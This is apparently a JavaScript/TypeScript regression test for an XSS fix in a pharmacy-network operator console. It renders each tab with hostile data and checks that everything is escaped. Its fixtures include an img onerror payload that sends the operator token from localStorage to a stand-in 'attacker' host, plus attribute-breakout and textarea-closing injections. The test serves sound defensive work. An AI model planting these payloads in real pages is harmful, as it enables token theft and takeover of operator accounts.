/*
 * Copyright 2026 Ben Humbert
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * The operator console escapes every name, ID and note it places in its pages — finding A-61.
 *
 * What was wrong: the thread lists in the console's four tabs, and its other tables, pickers and result cards, placed
 * values from the engine's state in innerHTML as they came: a wallet's display name and wallet ID, a group, plan,
 * family or thread ID, a member's relationship, a pharmacy's status note, an error, and on the pharmacy tab the
 * credential JSON pasted at the counter. A member's name is whatever its device gave register-member, so a name such
 * as <img src=x onerror="fetch(...+localStorage.zkt_operator_token)"> ran in the console's origin, which holds the
 * network's operator token. Only the message bubbles were escaped (message-thread.js). Found 2026-10-19 (A-61); the
 * security posture check of 2026-10-24 chained it to A-74 and to the operator token.
 *
 * Now every such value goes through message-thread.js escapeHtml before it reaches the page, in text, in a quoted
 * attribute and in a textarea; the helpers that shorten a hash or wallet ID for a cell escape what they return, and so
 * do the credential, forest and data cards of interactive-app.js.
 *
 * Each tab's class is loaded from source with its imports supplied from source too (message-thread.js,
 * nadac-price.js, the node-common.js table helpers and the interactive-app.js cards) and renders, into stand-in
 * elements, a state in which every name and ID is hostile. Nothing here needs a browser or a running engine.
 */
import fs from 'fs';

const NL = '\n';
const read = (file: string): string => fs.readFileSync(file, 'utf8').replace(/\r\n/g, NL);
const JS = 'visualizer/src/js';

/** A top-level function of an ES module: from its declaration to the first line that is exactly "}". */
function liftModule(src: string, name: string): string {
  const at = src.search(new RegExp(`\\n(export )?function ${name}\\(`));
  if (at < 0) throw new Error('no function ' + name);
  const end = src.indexOf(NL + '}' + NL, at);
  return src.slice(at + 1, end + 2).replace(/^export /, '');
}
/** A top-level const of an ES module: one line, or through the first line that is exactly "};". */
function liftConst(src: string, name: string): string {
  const at = src.indexOf(NL + 'const ' + name + ' =');
  if (at < 0) throw new Error('no const ' + name);
  const line = src.slice(at + 1, src.indexOf(NL, at + 1));
  if (line.trimEnd().endsWith(';')) return line;
  return src.slice(at + 1, src.indexOf(NL + '};' + NL, at) + 3);
}
function run(pieces: string[], scope: Record<string, unknown>, ret: string): any {
  const names = Object.keys(scope);
  return new Function(...names, `'use strict';\n${pieces.join(NL)}\nreturn ${ret};`)(...names.map((n) => scope[n]));
}
/** Every export of a console module that imports nothing, from source. */
function moduleExports(file: string): Record<string, unknown> {
  const src = read(file);
  const names = [...src.matchAll(/^export\s+(?:function|const)\s+([A-Za-z0-9_$]+)/gm)].map((m) => m[1]);
  return run([src.replace(/^export\s+/gm, '')], {}, `{ ${names.join(', ')} }`);
}

const thread = moduleExports(`${JS}/interactive/message-thread.js`);
const nadac = moduleExports(`${JS}/interactive/nadac-price.js`);
const COMMON = read(`${JS}/node-common.js`);
const APP = read(`${JS}/interactive-app.js`);
const common = run(['renderSectionCard', 'renderMetricRow', 'renderSortableTable', 'truncHash'].map((n) => liftModule(COMMON, n)), {},
  '{ renderSectionCard, renderMetricRow, renderSortableTable, truncHash }');
const cards = run([liftConst(APP, 'CREDENTIAL_TYPE_LABELS'), liftConst(APP, 'FOREST_DOMAIN_LABELS'),
  ...['formatCents', 'renderCredentialCard', 'renderForestCard', 'renderZkDataSection'].map((n) => liftModule(APP, n))],
{ escapeHtml: thread.escapeHtml }, '{ formatCents, renderCredentialCard, renderForestCard, renderZkDataSection }');

/** An element as the tabs use one; getElementById hands out one per id, so a test can read what was drawn into it. */
function stubElement(id: string): any {
  return {
    id, value: '', innerHTML: '', textContent: '', disabled: false, checked: false, dataset: {}, style: {},
    classList: { add() {}, remove() {}, toggle() {}, contains: () => false },
    addEventListener() {}, querySelectorAll: () => [], querySelector: () => null, scrollIntoView() {},
  };
}
function page() {
  const els: Record<string, any> = {};
  const el = (id: string) => (els[id] = els[id] ?? stubElement(id));
  return { els, document: { getElementById: el, querySelectorAll: () => [], querySelector: () => null } };
}

/** A console tab's class from source, its imports supplied as above, on a stand-in page. */
function loadTab(file: string, className: string) {
  const { els, document } = page();
  const src = read(`${JS}/interactive/${file}`)
    .replace(/import\s*\{[^}]*\}\s*from\s*'[^']+';/g, '')
    .replace(/^export\s+class\s+/m, 'class ');
  const scope: Record<string, unknown> = {
    API_BASE: '', updateChainState: () => undefined, loadInteractiveState: async () => null,
    checkInteractions: () => [], getDurStatus: () => 'green', renderDurBadge: () => '', renderInteractionAlerts: () => '',
    ...thread, ...nadac, ...common, ...cards,
    document, fetch: async () => ({ ok: false, json: async () => ({}) }), setTimeout: () => 0, alert: () => undefined,
  };
  const Tab = run([src], scope, className);
  const tab = new Tab({ setStatus() {}, isCompiled: () => true, fetchState: async () => undefined, state: null });
  return { tab, els };
}

// What a hostile node can register or send. Raw, each one runs script or ends the attribute it is placed in.
const NAME = '<img src=x onerror="fetch(`https://attacker/?t=`+localStorage.zkt_operator_token)">';
const ESCAPED_NAME = '&lt;img src=x onerror=&quot;fetch(`https://attacker/?t=`+localStorage.zkt_operator_token)&quot;&gt;';
const NAME2 = '<svg onload="steal()">Spouse';
const PROVIDER = '<u class="injected">Dr. Quill</u>';
const STORE = '<u class="injected">Fernhill Pharmacy</u>';
const attr = (prefix: string) => `${prefix}" onmouseover="steal()`;
const W = { member: attr('W1'), spouse: attr('W2'), insurer: '9001', prescriber: '9002', pharmacy: '9003' };
const THREAD = attr('T-1');
const DRUG = { index: 0, brandName: '<u class="injected">ABACAVIR</u>', genericName: 'ABACAVIR', strength: '300 MG', dosageForm: 'TABLET', route: 'ORAL', ndc: attr('00378'), ndcFormatted: '00378-4105-91', tier: 1, copayAmountCents: 1000, requiresPriorAuth: false, stepTherapyRequired: false, maxQuantityPerFill: 90, maxDaySupply: 90, nadacPerUnit: 0.60042, pricingUnit: 'EA', therapeuticClass: NAME2, deaSchedule: 0, manufacturer: PROVIDER };

const member = (walletId: string, displayName: string, relationship: string) => ({
  walletId, walletIdDisplay: walletId, displayName, memberIndex: -1, relationship, lifecycle: 'ELIGIBLE',
  groupId: '<u class="injected">GRP</u>', planId: attr('PLAN'), familyId: attr('FAM'),
  accumulator: { deductiblePaidCents: 0, oopPaidCents: 0 },
  pcpAssignment: { prescriberIndex: 0, prescriberName: PROVIDER, specialty: NAME2 },
  inNetworkPrescribers: [], inNetworkPharmacies: [],
});
const RX1 = { id: attr('RX-1'), memberWalletId: W.member, medicationIndex: 0, prescriberIndex: 0, pharmacyIndex: 0, medication: DRUG.brandName, medicationStrength: '300 MG', quantity: 30, quantityDispensed: 0, status: 'DISPENSED', refills: 0, statusHistory: [{ from: 'ACTIVE', to: 'DISPENSED', updatedBy: STORE, note: NAME, timestamp: 1 }] };
const RX2 = { ...RX1, id: 'RX-2', status: 'FILLED', quantityDispensed: 30, patientPayCents: 1000, planPayCents: 500, statusHistory: [] };
const message = (messageIndex: number, senderWalletId: string, recipientWalletId: string) => ({ messageIndex, senderWalletId, recipientWalletId, threadId: THREAD, messageType: attr('2'), timestamp: 1, hasEncryptedPayload: true, contentHash: '1', nonce: NAME2 });

const STATE = {
  compiled: true,
  enrolledMembers: [member(W.spouse, NAME2, '<svg onload="steal()">SPOUSE'), member(W.member, NAME, attr('SELF'))],
  walletDirectory: {
    [W.member]: { displayName: NAME, type: 'member' }, [W.spouse]: { displayName: NAME2, type: 'member' },
    [W.insurer]: { displayName: 'Insurer', type: 'insurer' }, [W.prescriber]: { displayName: PROVIDER, type: 'prescriber', index: 0 },
    [W.pharmacy]: { displayName: STORE, type: 'pharmacy', index: 0 },
  },
  messaging: {
    messageCount: 3, delegationCount: 1, keyCount: 2,
    messages: [message(0, W.member, W.insurer), message(1, W.spouse, W.prescriber), message(2, W.member, W.pharmacy)],
    delegations: [{ delegatorWalletId: W.member, delegateWalletId: W.spouse, scopeFlags: 1, relationshipCode: NAME2 }],
  },
  prescriptions: [RX1, RX2],
  fulfillments: [{ prescriptionId: 'RX-2', fillIndex: 0, patientPayCents: 1000, planPayCents: 500, totalCostCents: 1500, quantityDispensed: 30, serviceDateStr: attr('20261024'), settlementCommitment: '1234567890123456789012' }],
  priorAuths: [
    { id: attr('PA-1'), memberWalletId: W.member, medicationIndex: 0, medicationName: DRUG.brandName, medicationTier: 3, prescriberIndex: 0, prescriberName: PROVIDER, status: 'PENDING' },
    { id: 'PA-2', memberWalletId: W.member, medicationIndex: 0, medicationName: DRUG.brandName, medicationTier: 3, prescriberIndex: 0, prescriberName: PROVIDER, status: 'APPROVED', resolvedAt: 2 },
  ],
  formularyChangeHistory: [{ changeType: 'REMOVE', medicationName: DRUG.brandName, details: NAME2, affectedMembers: [] }],
  chainState: { walletRegistryRoot: '1', walletCount: 2, adminPublicKeyHash: '2', lifecycleRoot: '3', benefitPlanRoot: '4', nftRegistryRoot: '5', eligibilityVkHash: '6', messagingRoot: '7' },
  auditSummary: { enrollmentCount: 2, prescriptionCount: 2, fulfillmentCount: 1, totalPatientPayCents: 1000, totalPlanPayCents: 500 },
  demoData: {
    medications: [DRUG],
    prescribers: [{ index: 0, firstName: '<u class="injected">Avery</u>', lastName: 'Quill', credential: 'MD', specialty: NAME2, npi: '1234567890', state: 'WI' }],
    pharmacies: [{ index: 0, storeName: STORE, pharmacyType: 'Retail', address: '1 Main St', city: 'Madison', state: 'WI' }],
    members: [],
    plan: { planId: attr('PLAN-GOLD-2026'), copayAmountCents: 1000, deductibleAmountCents: 50000, oopMaxCents: 800000, annualBenefitMaxCents: 0, familyDeductibleAmountCents: 100000, familyOopMaxCents: 1600000, formularyCount: 1, formularyRoot: '1' },
    providerNetwork: { active: { [W.prescriber]: true }, root: '0', changeHistory: [{ changeType: 'ADD', prescriberName: PROVIDER, details: NAME, affectedMemberCount: 1 }] },
  },
  reports: {
    financialSummary: null,
    claimsRegister: { claims: [{ operationType: attr('fulfillment'), ndcHash: 'N1', memberWalletId: W.member, pharmacyWalletId: W.pharmacy, prescriberWalletId: W.prescriber, quantityDispensed: '30000', patientPayCents: 1000, planPayCents: 500 }], totalClaimCount: 1, totalReversalCount: 0 },
    pharmacyActivity: { pharmacies: [{ pharmacyWalletId: W.pharmacy, claimCount: 1, reversalCount: 0, uniqueMedications: 1, uniqueMembers: 1, costBreakdown: { totalPatientPayCents: 1000, totalPlanPayCents: 500, totalGrossCostCents: 1500 } }] },
    prescriberActivity: { prescribers: [{ prescriberWalletId: attr('unlisted'), prescriptionCount: 1, claimCount: 1, uniqueMedications: 1, uniqueMembers: 1, costBreakdown: { totalPatientPayCents: 1000, totalPlanPayCents: 500 } }] },
    memberActivity: { members: [{ memberWalletId: W.member, claimCount: 1, reversalCount: 0, currentMedications: [], costBreakdown: { totalPatientPayCents: 1000, totalPlanPayCents: 500 } }] },
    medicationUtilization: { medications: [{ ndcHash: 'N1', totalQuantity: '30000', totalClaimCount: 1, totalReversalCount: 0, uniquePharmacies: 1, uniquePrescribers: 1, uniqueMembers: 1 }] },
    priorAuthReport: { priorAuths: [{ ndcHash: 'N1', memberWalletId: W.member, prescriberWalletId: W.prescriber, approvedQuantity: '30000', utilizedQuantity: '0', utilizationRate: 0, hasClaimActivity: false }] },
    reversalReport: { reversals: [{ ndcHash: 'N2', memberWalletId: W.member, pharmacyWalletId: W.pharmacy, quantityDispensed: '1000', patientPayCents: 1, planPayCents: 1 }], totalPatientRefundCents: 1, totalPlanRefundCents: 1 },
    ndcDirectory: { N1: { brandName: NAME, ndc: attr('00378'), tier: 1 } },
  },
  l2: {
    status: { running: true, uptimeMs: 1000, nextBatchInMs: 0, pendingProofs: 0, totalProofsAccepted: 1, totalBatchesBuilt: 1, totalBatchesSettled: 0, totalBatchesFailed: 0, currentRegistryRoot: '1', currentLifecycleRoot: '2', currentWalletCount: 2 },
    receipts: [{ receiptId: attr('R-0001'), walletId: W.member, isRegistration: true, sequenceNumber: 1, l1Status: attr('pending'), acceptedAt: 1 }],
    batches: [{ batchNumber: 1, registrationCount: 1, transitionCount: 0, l1Status: NAME2, l1TxHash: attr('TX-1'), createdAt: 1 }],
    auditLog: { eventCount: 1, latestChainHash: '123', genesisHash: '0' },
  },
};

/** No hostile value left as markup or as an attribute it can end. */
function expectInert(html: string, where: string) {
  expect(html.length).toBeGreaterThan(200);
  for (const raw of ['<img src=x', '<svg onload', 'class="injected"', 'onmouseover="', 'onerror="', '</textarea><']) {
    expect([where, raw, html.includes(raw)]).toEqual([where, raw, false]);
  }
}

describe('each tab draws hostile names and IDs as text', () => {
  test('the insurer tab: its thread list, recipient picker, wallet registry, PA queue and network table', () => {
    const { tab, els } = loadTab('insurer-tab.js', 'InsurerTab');
    tab.render(STATE);
    const html: string = els['tab-insurer'].innerHTML;
    expectInert(html, 'insurer');                                                     // before: every one of them raw
    expect(html).toContain(`<strong style="font-size: 12px; margin-left: 4px;">${ESCAPED_NAME}</strong>`);   // the thread list (A-61)
    expect(html).toContain('data-thread-id="T-1&quot; onmouseover=&quot;steal()"');
    expect(html).toContain(`<option value="member:W1&quot; onmouseover=&quot;steal()">${ESCAPED_NAME}</option>`);
    expect(html).toContain('data-pa-id="PA-1&quot; onmouseover=&quot;steal()"');
  });

  test('the member tab: its dashboard header, family picker, thread list and delegation table', () => {
    const { tab, els } = loadTab('member-phase.js', 'MemberPhase');
    tab.render(STATE);
    const html: string = els['tab-member'].innerHTML;
    expectInert(html, 'member');
    expect(html).toContain(`Member Dashboard — ${ESCAPED_NAME}`);
    expect(html).toContain('<span class="family-badge self&quot; onmouseover=&quot;steal()">SELF&quot; onmouseover=&quot;steal()</span>');
    // the member's thread ends with its message to the pharmacy, so the list names the pharmacy as registered
    expect(html).toContain('<strong style="font-size: 12px; margin-left: 4px;">&lt;u class=&quot;injected&quot;&gt;Fernhill Pharmacy&lt;/u&gt;</strong>');
  });

  test('the prescriber tab: its patient picker, thread list, PCP patients, PA requests and history tables', () => {
    const { tab, els } = loadTab('prescriber-phase.js', 'PrescriberPhase');
    tab.selectedPrescriber = 0;                                                       // the tables that follow a prescriber
    tab.render(STATE);
    const html: string = els['tab-prescriber'].innerHTML;
    expectInert(html, 'prescriber');
    expect(html).toContain(`<option value="W1&quot; onmouseover=&quot;steal()">${ESCAPED_NAME} [SELF&quot; onmouseover=&quot;steal()]`);
    expect(html).toContain('<strong style="font-size: 12px; margin-left: 4px;">&lt;svg onload=&quot;steal()&quot;&gt;Spouse</strong>');
    expect(html).toContain(`<td style="">${ESCAPED_NAME}</td>`);                       // a renderSortableTable cell
  });

  test('the pharmacy tab: its queues, fill details, status notes, thread list and the wallet ID typed at the counter', () => {
    const { tab, els } = loadTab('pharmacy-phase.js', 'PharmacyPhase');
    tab.selectedRxId = RX1.id;
    tab.scannedMemberWalletId = W.member;
    tab.render(STATE);
    const html: string = els['tab-pharmacy'].innerHTML;
    expectInert(html, 'pharmacy');
    expect(html).toContain('value="W1&quot; onmouseover=&quot;steal()" />');
    expect(html).toContain(`<span style="color: var(--text-muted);">— ${ESCAPED_NAME}</span>`);   // a pharmacy node's status note
    expect(html).toContain(`<strong style="font-size: 12px; margin-left: 4px;">${ESCAPED_NAME}</strong>`);
  });

  test('the pharmacy tab: a pasted credential stays inside its textarea', () => {
    const { tab, els } = loadTab('pharmacy-phase.js', 'PharmacyPhase');
    tab.scannedMemberWalletId = W.member;
    tab.scannedCredentialJson = '{"publicOutput":{"walletId":"1"}}</textarea><img src=x onerror=steal()>';
    tab.render(STATE);
    const html: string = els['tab-pharmacy'].innerHTML;
    expectInert(html, 'pharmacy credential');
    expect(html).toContain('&lt;/textarea&gt;&lt;img src=x onerror=steal()&gt;</textarea>');   // before: the textarea closed early
  });

  test('the reports and L2 chain tabs: registered names, wallet IDs and statuses', () => {
    const reports = loadTab('reports-tab.js', 'ReportsTab');
    reports.tab.render(STATE);
    const reportsHtml: string = reports.els['tab-reports'].innerHTML;
    expectInert(reportsHtml, 'reports');
    expect(reportsHtml).toContain(`<td>${ESCAPED_NAME}</td>`);
    const chain = loadTab('l2-chain-tab.js', 'L2ChainTab');
    chain.tab.render(STATE);
    const chainHtml: string = chain.els['tab-l2chain'].innerHTML;
    expectInert(chainHtml, 'l2 chain');
    expect(chainHtml).toContain('title="W1&quot; onmouseover=&quot;steal()"');
  });
});

describe('the cards that show an engine reply', () => {
  test('the credential, forest and data cards escape every field', () => {
    const html = [
      cards.renderCredentialCard('Credential', { nftType: NAME2, forestRoot: attr('F'), issuerWalletId: W.member, subjectWalletId: NAME, issuedAt: '1', expiresAt: '0', revoked: '0', commitment: attr('C') }, 'member'),
      cards.renderForestCard('Forest', { memberRoot: NAME, prescriberRoot: '1', pharmacyRoot: '1', medicationRoot: '1', accessControlRoot: '1', transactionRoot: '1', forestRoot: attr('F') }, 'member'),
      cards.renderZkDataSection('Data', { [NAME2]: NAME, walletId: W.member }, 'member', '3 fields', attr('C')),
    ].join('');
    expectInert(html, 'cards');                                                       // before: the fields raw
    expect(html).toContain(`<div class="zk-value">${ESCAPED_NAME}</div>`);
  });
});
